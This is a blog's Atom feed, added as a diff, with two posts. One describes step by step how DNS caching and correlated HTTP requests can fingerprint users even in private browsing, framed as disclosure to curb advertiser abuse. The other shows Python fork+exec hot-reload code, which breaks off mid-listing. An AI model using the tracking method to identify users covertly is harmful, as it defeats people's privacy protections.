@@ -1,0 +1,1486 @@
+<?xml version="1.0" encoding="utf-8"?>
+<feed xmlns="http://www.w3.org/2005/Atom"><title>devsda - blog - tech</title><link href="http://blog.devsda.fr/" rel="alternate"></link><link href="http://blog.devsda.fr/feeds/tech.atom.xml" rel="self"></link><id>http://blog.devsda.fr/</id><updated>2019-09-02T00:05:00+02:00</updated><entry><title>DNS tracking &amp; identification</title><link href="http://blog.devsda.fr/dns_tracking.html" rel="alternate"></link><published>2019-09-02T00:05:00+02:00</published><updated>2019-09-02T00:05:00+02:00</updated><author><name>Thomas</name></author><id>tag:blog.devsda.fr,2019-09-02:/dns_tracking.html</id><summary type="html">&lt;p&gt;How can you be tracked around using stateless web and a few DNS queries&lt;/p&gt;</summary><content type="html">&lt;h1&gt;Context&lt;/h1&gt;
+&lt;p&gt;I work in the advertising field. Months ago, I heard about DNS Cookies but did not believe that one can actually track people using it.
+I was wrong&lt;/p&gt;
+&lt;p&gt;So we had that website, &lt;a href="http://www.dnscookie.com/"&gt;dnscookie.com&lt;/a&gt; hitting the top on hackernews.&lt;/p&gt;
+&lt;p&gt;Eventually, in the advertising field, a lot of people asked themselves about it. 
+dnscookie.com explains basically how we can track users using DNS Cookies, but (IMHO) is not very precise.&lt;/p&gt;
+&lt;p&gt;I decided to take a look on my spare time and publish everything I learnt.&lt;/p&gt;
+&lt;p&gt;In my own point of view, explaining this method to "everyone" is a way to prevent abuses from avertising companies.&lt;/p&gt;
+&lt;hr&gt;
+&lt;p&gt;I'll use the term "DNS tracking" instead of DNS Cookie, to avoid confusion with &lt;a href="https://tools.ietf.org/html/rfc7873"&gt;RFC 7873&lt;/a&gt;&lt;/p&gt;
+&lt;h1&gt;General Explanation&lt;/h1&gt;
+&lt;p&gt;There is two important things involved in order to track users using DNS.&lt;/p&gt;
+&lt;ul&gt;
+&lt;li&gt;&lt;a href="https://tools.ietf.org/html/rfc7873"&gt;RFC 7873&lt;/a&gt;: DNS Cookies. It allows "grouping" DNS Queries and answers per clients, at server side, by doing, eg, log UDP network analysis.&lt;/li&gt;
+&lt;li&gt;HTTP has to be used at some point. Individual HTTP Queries have to be correlated with DNS activity, especially when &lt;em&gt;the DNS cache is hit&lt;/em&gt;&lt;/li&gt;
+&lt;/ul&gt;
+&lt;p&gt;The general method can be explained in 4 steps, with 4 prerequesites.&lt;/p&gt;
+&lt;ul&gt;
+&lt;li&gt;You own and control the authoritative DNS Server involved&lt;/li&gt;
+&lt;li&gt;Same for HTTP Servers&lt;/li&gt;
+&lt;li&gt;You have to hack both to emit various events in real time, ie, DNS resolutions and HTTP GET queries&lt;/li&gt;
+&lt;li&gt;You have to be able to correlate events emited by those below, in &lt;em&gt;pseudo-realtime&lt;/em&gt;&lt;/li&gt;
+&lt;/ul&gt;
+&lt;p&gt;&lt;strong&gt;Steps:&lt;/strong&gt;&lt;/p&gt;
+&lt;ul&gt;
+&lt;li&gt;
+&lt;p&gt;&lt;strong&gt;(1)&lt;/strong&gt;: Force a client to perform DNS resolutions on various subdomains subsequently followed by HTTP queries.&lt;br&gt;
+  This is achieved by including &lt;em&gt;statics&lt;/em&gt; within a webpage, like images or even fonts (using CSS for tracking? Who cares).&lt;/p&gt;
+&lt;/li&gt;
+&lt;li&gt;
+&lt;p&gt;&lt;strong&gt;(2)&lt;/strong&gt;: Extract DNS resolutions performed by a single client (identifiable using the DNS Cookie) in step (1).&lt;br&gt;
+  Those could be missing if the client is already known (== DNS answer still in client's cache).&lt;/p&gt;
+&lt;/li&gt;
+&lt;li&gt;
+&lt;p&gt;&lt;strong&gt;(3)&lt;/strong&gt;: HTTP requests are fired by the browser to fetch statics, on domains previously resolved in (1) or stored in DNS cache.&lt;br&gt;
+  Considering 2 backend HTTP Servers and 32 HTTP queries distributed (randomly) on both, this creates or recreates&lt;br&gt;
+&lt;em&gt;a 32 bits identifier&lt;/em&gt;. &lt;/p&gt;
+&lt;/li&gt;
+&lt;li&gt;
+&lt;p&gt;&lt;strong&gt;(4)&lt;/strong&gt;: as every resouce queried in HTTP is uniquely identifiable, correlating batches of 32 queries on multiple backend servers allow us to 
+  forge a somewhat reliable identifier.&lt;br&gt;
+  If the client is already known, the step (1) and (2) are skipped, because DNS answers are still in the client's cache, 
+  and the distribution on backends HTTP server will be the same. Leading to the same identifier.&lt;/p&gt;
+&lt;/li&gt;
+&lt;/ul&gt;
+&lt;p&gt;It's somewhat important to avoid any browser-based caching at step (3). 
+This is prevented by using unique URLs, as the initial index.html (or whatever includes our 32 statics inclusion) is generated on-the-fly for each HTTP query.&lt;/p&gt;
+&lt;h1&gt;Sequence Diagram&lt;/h1&gt;
+&lt;p&gt;example.com has IP &lt;em&gt;10.10.0.1&lt;/em&gt;&lt;/p&gt;
+&lt;p&gt;Two IP are used to determine/forge an identifier, &lt;em&gt;10.10.1.1&lt;/em&gt; and &lt;em&gt;10.10.1.2&lt;/em&gt;&lt;/p&gt;
+&lt;p&gt;&lt;img alt="" src="../images/dns_cookie_tracking.png"&gt;&lt;/p&gt;
+&lt;h1&gt;Efficiencies&lt;/h1&gt;
+&lt;p&gt;I was able to track myself, even while switching to &lt;em&gt;private navigation&lt;/em&gt;, with a high rate of success.
+(from my own &lt;em&gt;poc&lt;/em&gt;, failures were essentially due to errors/imprecisions in my code)&lt;/p&gt;
+&lt;p&gt;It's like the same DNS cache is shared in major web browsers, &lt;strong&gt;even when private navigation is used&lt;/strong&gt;. I'll be happy if someone could confirm/infirm this.&lt;/p&gt;
+&lt;p&gt;From an advertiser point of view, this could complete a more traditionnal &lt;em&gt;cookie-based&lt;/em&gt; approach. &lt;/p&gt;
+&lt;h1&gt;Possible inefficiencies&lt;/h1&gt;
+&lt;h2&gt;Cache control&lt;/h2&gt;
+&lt;p&gt;Due to the recursive nature of the DNS, multiple levels of caching could be an issue.&lt;/p&gt;
+&lt;h2&gt;Shared cache&lt;/h2&gt;
+&lt;p&gt;If the cache is shared against many clients, It become hard to track a single user. &lt;/p&gt;
+&lt;p&gt;This kind of setup is common within entreprise-grade networks.
+This could eventually be tricked by using a large number of sudomains, or dynamic subdomains using unique identifiers.&lt;/p&gt;
+&lt;p&gt;At this point, a large and frequent load of DNS resolutions using high domain entropy could trigger some intrusion detection systems. &lt;/p&gt;
+&lt;h2&gt;Reaction from vendors&lt;/h2&gt;
+&lt;p&gt;I don't know the major web-browser positions on this topic.
+From my (naive) perspective, Countermeasures could be easily implemented client-side, eg, by ignoring supplied DNS cookies.&lt;/p&gt;
+&lt;h2&gt;Available Countermeasures&lt;/h2&gt;
+&lt;p&gt;I don't know any simple trick to avoid this tracking. If it's well implemented, it's pretty efficient.
+Once again, if someone has an idea, let me know.&lt;/p&gt;
+&lt;h1&gt;My point of view&lt;/h1&gt;
+&lt;p&gt;The traditionnal use of HTTP Cookies for tracking purpose is already somewhat an abuse.&lt;/p&gt;
+&lt;p&gt;DNS tracking &lt;em&gt;abuses&lt;/em&gt; a different level, the DNS Protocol and DNS-Cookies. 
+It's similar to a de-anonymisation attack. Cache is abused and logs from two differents protocols (DNS/HTTP) are correlated.&lt;/p&gt;
+&lt;p&gt;Considering the GDPR, the DNS cookie could be considered as something that permits unique identification. &lt;/p&gt;
+&lt;p&gt;Anyway, it's hard to believe that the "online advertising world" is trying to help consumers using such ... nasty tricks? &lt;/p&gt;
+&lt;p&gt;I'd better bet on privacy to regain consumers trust, then try to disrupt how preferences and behavior are used, to offer more control to the end-user and a less invasive approach. But that's way too utopic because ... nobody likes ads?&lt;/p&gt;</content><category term="advertising"></category><category term="tracking"></category><category term="DNS"></category></entry><entry><title>Fork+Exec</title><link href="http://blog.devsda.fr/forkexec.html" rel="alternate"></link><published>2019-01-08T13:20:00+01:00</published><updated>2019-01-08T13:25:00+01:00</updated><author><name>devsda</name></author><id>tag:blog.devsda.fr,2019-01-08:/forkexec.html</id><summary type="html">&lt;p&gt;Hot Reloading network-related code using syscalls older than me&lt;/p&gt;</summary><content type="html">&lt;h1&gt;Hot Reloading&lt;/h1&gt;
+&lt;p&gt;Any HTTP Server have to &lt;em&gt;setup&lt;/em&gt; and &lt;em&gt;bind&lt;/em&gt; a socket to any available port. This is basically how 
+any kind of server work. Even in IPv6. Even within a blockchain😂! &lt;/p&gt;
+&lt;p&gt;At some point, you'll have to restart them. Depending on the task 
+(code deployment, configuration deployment, server update), the process (at OS level) may need to stop 
+and start again. During this process, the main listening socket (usually bound on port 80 or 443 in the simplest configuration) could eventually 
+"disconnect" and let your clients hitting a dry wall, leading to service discontinuation - and often, we (IT people) don't like that very much. &lt;/p&gt;
+&lt;p&gt;At my previous job, I wondered how &lt;a href="https://uwsgi-docs.readthedocs.io/en/latest/"&gt;uWSGI&lt;/a&gt; &lt;em&gt;(which is itself a kind of HTTP Server with tons of features)&lt;/em&gt; performs 
+its "hot-reload", without "un-binding" it's main socket. Yep. It does that. Without crashing clients. At all!&lt;/p&gt;
+&lt;p&gt;Let's be clear - we don't talk about automatic recompilation when the code changes - but delivering consistent HTTP responses for a thousand of motherfuckers per seconds while 
+upgrading business critical software!&lt;/p&gt;
+&lt;h2&gt;Other approach&lt;/h2&gt;
+&lt;p&gt;In modern configurations, we often relies on load-balancers during &lt;em&gt;rolling updates&lt;/em&gt;, because a few nodes may eventually be unavailable during the reload operation. &lt;/p&gt;
+&lt;p&gt;In an other hand, essentially in functionnal languages (but can be also done in Java), you can "update" the runtime while it's running. This is the case with &lt;em&gt;Clojure&lt;/em&gt; and &lt;em&gt;Erlang&lt;/em&gt;, both respectively 
+relying on the &lt;em&gt;JVM&lt;/em&gt; and &lt;em&gt;BEAM&lt;/em&gt;. 
+Because of the emphasis on purity (lack of side effects, globals, vars, etc), one can update a function's code without worrying breaking everything down. &lt;/p&gt;
+&lt;hr&gt;
+&lt;p&gt;But still - that's a lot of constrains.
+What about a "real" OS Process level hot reloading?&lt;/p&gt;
+&lt;h2&gt;At process (Linux) level&lt;/h2&gt;
+&lt;p&gt;&lt;em&gt;Returning to the uWSGI example from above&lt;/em&gt; &lt;/p&gt;
+&lt;p&gt;When you deploy a new configuration or new code, you basically ask uWSGI to reload and, "magic happens".
+You'll see uWSGI lying around with a brand new &lt;em&gt;PID&lt;/em&gt;, but the listening socket is still there - still listening without interruption.&lt;/p&gt;
+&lt;p&gt;No high-level trick nor load-balancing are needed - Linux can fucking handle this if your code is smart enough :)
+You can even restore client's states - which is awesome for long polling connection.&lt;/p&gt;
+&lt;h2&gt;Lazy version&lt;/h2&gt;
+&lt;p&gt;Using &lt;code&gt;SO_REUSEADDR&lt;/code&gt; and &lt;code&gt;SO_REUSEPORT&lt;/code&gt;, one can bind more than one socket (from one or more processes) on a given couple &lt;code&gt;(IP, PORT)&lt;/code&gt;.
+We can achieve a somewhat "grateful reloading" with these:&lt;/p&gt;
+&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;span class="n"&gt;main_socket&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;setsockopt&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;socket&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;SOL_SOCKET&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="n"&gt;socket&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;SO_REUSEADDR&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="mi"&gt;1&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;
+&lt;span class="n"&gt;main_socket&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;setsockopt&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;socket&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;SOL_SOCKET&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="n"&gt;socket&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;SO_REUSEPORT&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="mi"&gt;1&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;
+&lt;/pre&gt;&lt;/div&gt;
+
+
+&lt;p&gt;and start a &lt;em&gt;parallel&lt;/em&gt;, &lt;em&gt;updated&lt;/em&gt; process, while asking the &lt;em&gt;oldest and deprecated&lt;/em&gt; to stop accepting new clients.
+But still ... this implies a new socket somewhere. Also, it implies a recent Linux Kernel.&lt;/p&gt;
+&lt;h1&gt;Fork+exec&lt;/h1&gt;
+&lt;h2&gt;Explanation:&lt;/h2&gt;
+&lt;p&gt;These are a few prerequisites:&lt;/p&gt;
+&lt;ul&gt;
+&lt;li&gt;Sockets should be configured without the flag &lt;code&gt;SOCK_CLOEXEC&lt;/code&gt;. Else, all opened filedescriptors will automatically close at &lt;code&gt;exec&lt;/code&gt; call.&lt;/li&gt;
+&lt;li&gt;main socket's &lt;em&gt;bind&lt;/em&gt; operation should only be done once - after the initial creation. While reloading, this socket is never recreated - but instead duplicated from a &lt;em&gt;fileno&lt;/em&gt; passed as argument to the program itself.&lt;/li&gt;
+&lt;li&gt;&lt;code&gt;fcntl(server_socket, fcntl.F_SETFD, socket.SOCK_CLOEXEC)&lt;/code&gt; looks always mandatory, even after a reload. I can't explain this right know.&lt;/li&gt;
+&lt;/ul&gt;
+&lt;p&gt;&lt;img alt="diag" src="http://blog.devsda.fr/images/fork_exec_diag.png"&gt;&lt;/p&gt;
+&lt;h2&gt;Commented code (python3):&lt;/h2&gt;
+&lt;p&gt;This example leverage the fork+exec mechanism using Python and its standard library.
+It stays easy to read (and easier/faster to write than C equivalent)&lt;/p&gt;
+&lt;p&gt;I kept it very simple - this server can't handle concurrent clients, and that's okay. &lt;/p&gt;
+&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;span class="ch"&gt;#!/bin/env python3&lt;/span&gt;
+&lt;span class="kn"&gt;import&lt;/span&gt; &lt;span class="nn"&gt;os&lt;/span&gt;
+&lt;span class="kn"&gt;import&lt;/span&gt; &lt;span class="nn"&gt;fcntl&lt;/span&gt;
+&lt;span class="kn"&gt;import&lt;/span&gt; &lt;span class="nn"&gt;socket&lt;/span&gt;
+&lt;span class="kn"&gt;import&lt;/span&gt; &lt;span class="nn"&gt;signal&lt;/span&gt;
+&lt;span class="kn"&gt;import&lt;/span&gt; &lt;span class="nn"&gt;argparse&lt;/span&gt;
+
+&lt;span class="c1"&gt;# fork + exec python server example&lt;/span&gt;
+
+&lt;span class="n"&gt;server_socket&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="bp"&gt;None&lt;/span&gt;
+&lt;span class="n"&gt;client_sockets&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="p"&gt;[]&lt;/span&gt;
+
+
+&lt;span class="k"&gt;def&lt;/span&gt; &lt;span class="nf"&gt;client_processing&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;sock&lt;/span&gt;&lt;span class="p"&gt;):&lt;/span&gt;
+    &lt;span class="sd"&gt;&amp;#39;&amp;#39;&amp;#39;&lt;/span&gt;
+&lt;span class="sd"&gt;    Hello World™ for the socket programming world&lt;/span&gt;
+&lt;span class="sd"&gt;    &amp;#39;&amp;#39;&amp;#39;&lt;/span&gt;
+    &lt;span class="k"&gt;while&lt;/span&gt; &lt;span class="bp"&gt;True&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt;
+        &lt;span class="n"&gt;ct&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="n"&gt;sock&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;recv&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="mi"&gt;4096&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;
+        &lt;span class="k"&gt;if&lt;/span&gt; &lt;span class="sa"&gt;b&lt;/span&gt;&lt;span class="s1"&gt;&amp;#39;hello&amp;#39;&lt;/span&gt; &lt;span class="ow"&gt;in&lt;/span&gt; &lt;span class="n"&gt;ct&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt;
+            &lt;span class="n"&gt;sock&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;send&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="sa"&gt;b&lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;... world!&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;
+            &lt;span class="k"&gt;break&lt;/span&gt;
+    &lt;span class="n"&gt;sock&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;close&lt;/span&gt;&lt;span class="p"&gt;()&lt;/span&gt;
+
+
+
+&lt;span class="k"&gt;def&lt;/span&gt; &lt;span class="nf"&gt;reload_now&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="o"&gt;*&lt;/span&gt;&lt;span class="n"&gt;args&lt;/span&gt;&lt;span class="p"&gt;):&lt;/span&gt;
+    &lt;span class="sd"&gt;&amp;#39;&amp;#39;&amp;#39;&lt;/span&gt;
+&lt;span class="sd"&gt;    asynchronously called by a signal&lt;/span&gt;
+&lt;span class="sd"&gt;    (here, SIGUSR1)&lt;/span&gt;
+&lt;span class="sd"&gt;    &amp;#39;&amp;#39;&amp;#39;&lt;/span&gt;
+    &lt;span class="n"&gt;pid&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="n"&gt;os&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;fork&lt;/span&gt;&lt;span class="p"&gt;()&lt;/span&gt;
+
+    &lt;span class="k"&gt;if&lt;/span&gt; &lt;span class="n"&gt;pid&lt;/span&gt; &lt;span class="o"&gt;==&lt;/span&gt; &lt;span class="mi"&gt;0&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt;
+        &lt;span class="c1"&gt;# child&lt;/span&gt;
+        &lt;span class="n"&gt;client_filenos&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="p"&gt;[&lt;/span&gt;&lt;span class="nb"&gt;str&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;i&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;fileno&lt;/span&gt;&lt;span class="p"&gt;())&lt;/span&gt; &lt;span class="k"&gt;for&lt;/span&gt; &lt;span class="n"&gt;i&lt;/span&gt; &lt;span class="ow"&gt;in&lt;/span&gt; &lt;span class="n"&gt;client_sockets&lt;/span&gt;&lt;span class="p"&gt;]&lt;/span&gt;        
+        &lt;span class="k"&gt;print&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;f&lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;child: main.py {server_socket.fileno()} {&amp;#39; &amp;#39;.join(client_filenos)}&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;
+        &lt;span class="n"&gt;os&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;execvp&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="vm"&gt;__file__&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="p"&gt;[&lt;/span&gt;&lt;span class="vm"&gt;__file__&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="nb"&gt;str&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;server_socket&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;fileno&lt;/span&gt;&lt;span class="p"&gt;()),&lt;/span&gt; &lt;span class="o"&gt;*&lt;/span&gt;&lt;span class="p"&gt;[&lt;/span&gt;&lt;span class="nb"&gt;str&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;i&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt; &lt;span class="k"&gt;for&lt;/span&gt; &lt;span class="n"&gt;i&lt;/span&gt; &lt;span class="ow"&gt;in&lt;/span&gt; &lt;span class="n"&gt;client_filenos&lt;/span&gt;&lt;span class="p"&gt;]])&lt;/span&gt;
+    &lt;span class="k"&gt;elif&lt;/span&gt; &lt;span class="n"&gt;pid&lt;/span&gt; &lt;span class="o"&gt;!=&lt;/span&gt; &lt;span class="o"&gt;-&lt;/span&gt;&lt;span class="mi"&gt;1&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt;
+        &lt;span class="c1"&gt;# parent&amp;#39;s exit&lt;/span&gt;
+        &lt;span class="c1"&gt;# achieve a daemon&lt;/span&gt;
+        &lt;span class="k"&gt;print&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="s1"&gt;&amp;#39;parent is exiting&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;
+        &lt;span class="nb"&gt;exit&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="mi"&gt;0&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;
+    &lt;span class="k"&gt;else&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt;
+        &lt;span class="k"&gt;print&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="s1"&gt;&amp;#39;os.fork failed :(&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;
+        &lt;span class="nb"&gt;exit&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="mi"&gt;1&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;
+
+
+
+&lt;span class="k"&gt;def&lt;/span&gt; &lt;span class="nf"&gt;start&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;server_fileno&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="n"&gt;clients_fileno&lt;/span&gt;&lt;span class="p"&gt;):&lt;/span&gt;
+    &lt;span class="sd"&gt;&amp;#39;&amp;#39;&amp;#39;&lt;/span&gt;
+&lt;span class="sd"&gt;    Server entry point.&lt;/span&gt;
+&lt;span class="sd"&gt;    This function can be called in two different ways:&lt;/span&gt;
+
+&lt;span class="sd"&gt;    (None, []) -&amp;gt; setup a classic listening socket&lt;/span&gt;
+&lt;span class="sd"&gt;    (filedescriptor: str, clients_fileno: List[str]) -&amp;gt; &amp;quot;re&amp;quot; bind the listening socket&lt;/span&gt;
+&lt;span class="sd"&gt;    then continue to serve previously accepted clients&lt;/span&gt;
+&lt;span class="sd"&gt;    &amp;#39;&amp;#39;&amp;#39;&lt;/span&gt;
+    &lt;span class="k"&gt;print&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;f&lt;/span&gt;&lt;span class="s1"&gt;&amp;#39;&lt;/span&gt;&lt;span class="se"&gt;\n&lt;/span&gt;&lt;span class="s1"&gt;...START&lt;/span&gt;&lt;span class="se"&gt;\n&lt;/span&gt;&lt;span class="s1"&gt;  {server_fileno}, {clients_fileno} &amp;#39;&lt;/span&gt; &lt;span class="p"&gt;)&lt;/span&gt;
+    &lt;span class="k"&gt;global&lt;/span&gt; &lt;span class="n"&gt;server_socket&lt;/span&gt;
+    &lt;span class="k"&gt;global&lt;/span&gt; &lt;span class="n"&gt;client_sockets&lt;/span&gt;
+    &lt;span class="n"&gt;signal&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;signal&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;signal&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;SIGUSR1&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="n"&gt;reload_now&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;
+
+    &lt;span class="k"&gt;if&lt;/span&gt; &lt;span class="n"&gt;server_fileno&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt;
+        &lt;span class="c1"&gt;# open &amp;quot;inherited&amp;quot; socket&lt;/span&gt;
+        &lt;span class="n"&gt;server_socket&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="n"&gt;socket&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;fromfd&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="nb"&gt;int&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;server_fileno&lt;/span&gt;&lt;span class="p"&gt;),&lt;/span&gt; &lt;span class="n"&gt;socket&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;AF_INET&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="n"&gt;socket&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;SOCK_STREAM&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;
+        &lt;span class="c1"&gt;# We have to call fcnt again, dunno really why.&lt;/span&gt;
+        &lt;span class="c1"&gt;# If not, we can only reload once, which is stupid&lt;/span&gt;
+        &lt;span class="n"&gt;fcntl&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;fcntl&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;server_socket&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="n"&gt;fcntl&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;F_SETFD&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="n"&gt;socket&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;SOCK_CLOEXEC&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;
+    &lt;span class="k"&gt;else&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt;
+        &lt;span class="c1"&gt;# create socket&lt;/span&gt;
+        &lt;span class="n"&gt;server_socket&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="n"&gt;socket&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;socket&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;socket&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;AF_INET&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="n"&gt;socket&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;SOCK_STREAM&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;
+        &lt;span class="n"&gt;fcntl&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;fcntl&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;server_socket&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="n"&gt;fcntl&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;F_SETFD&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="n"&gt;socket&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;SOCK_CLOEXEC&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;
+        &lt;span class="c1"&gt;# set main socket options&lt;/span&gt;
+        &lt;span class="n"&gt;server_socket&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;setsockopt&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;socket&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;SOL_SOCKET&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="n"&gt;socket&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;SO_REUSEADDR&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="mi"&gt;1&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;
+        &lt;span class="n"&gt;server_socket&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;setsockopt&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;socket&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;SOL_SOCKET&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="n"&gt;socket&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;SO_REUSEPORT&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="mi"&gt;1&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;
+
